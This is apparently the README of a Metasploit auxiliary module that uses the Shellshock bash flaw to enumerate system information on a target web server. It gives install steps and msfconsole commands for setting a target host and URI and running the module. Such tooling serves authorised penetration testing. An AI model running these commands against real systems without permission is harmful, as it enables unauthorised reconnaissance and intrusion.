shellshock_enum
===============

This is a metasploit moduel that enumerates system info via Shellshock.
Install ruby script in $MSF/modules/auxiliary/scanner/http

Usage: 

msf > use auxiliary/scanner/http/shellshock_enum 

msf auxiliary(shellshock_enum) > set RHOST <target-ip>

msf auxiliary(shellshock_enum) > set TARGETURI <target-uri>

msf auxiliary(shellshock_enum) > show options

      ...show and set options...
      
msf auxiliary(shellshock_enum) > run
